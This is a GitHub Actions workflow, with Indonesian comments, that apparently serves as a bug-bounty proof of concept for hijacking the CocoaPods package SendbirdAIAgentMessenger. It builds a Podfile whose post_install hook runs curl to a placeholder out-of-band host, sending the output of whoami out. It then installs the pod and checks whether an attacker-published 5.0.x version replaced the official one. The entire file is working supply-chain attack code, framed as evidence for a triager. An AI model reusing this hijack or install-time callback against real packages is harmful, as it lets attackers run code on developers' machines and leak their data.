name: Execute_PoC
on: [push, workflow_dispatch]

jobs:
  test-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Headless Pod Test
        run: |
          mkdir -p TrialRun
          cd TrialRun
          
          # Setup Git
          git config --global user.email "researcher@test.com"
          git config --global user.name "Researcher"

          # Tulis Podfile MODE HEADLESS + RCE TRIGGER
          cat <<EOF > Podfile
          install! 'cocoapods', :integrate_targets => false

          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
          source 'https://cdn.cocoapods.org/'

          platform :ios, '15.0'

          target 'PoCSimulation' do
            use_frameworks!
            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
          end

          # INI ADALAH BUKTI IMPACT (RCE) UNTUK TRIAGER
          post_install do |installer|
            puts "\n[!] TRIGGERING SECURITY AUDIT PROBE..."
            # GANTI URL DI BAWAH DENGAN LINK OAST/INTERACTSH LU YANG BARU
            system("curl -v http://LINK-OAST-LU-DISINI.com/RCE_CONFIRMED_$(whoami)")
          end
          EOF

      - name: Execution & Hijack Proof
        run: |
          cd TrialRun
          # Jalankan install. --repo-update memastikan dia narik metadata terbaru (v5.0.x lu)
          pod install --repo-update --verbose
          
          echo -e "\n--- BUKTI FINAL UNTUK TRIAGER ---"
          if [ -f Podfile.lock ]; then
            cat Podfile.lock
            if grep -q "5.0." Podfile.lock; then
              echo "✅ SUCCESS: Pod Sendbird berhasil dibajak ke versi 5.0.x!"
            else
              echo "❌ FAILED: Masih menggunakan versi resmi. Cek apakah v5.0.x lu sudah beneran ter-publish di Trunk."
            fi
          else
            echo "❌ ERROR: Podfile.lock tidak ter-generate."
          fi
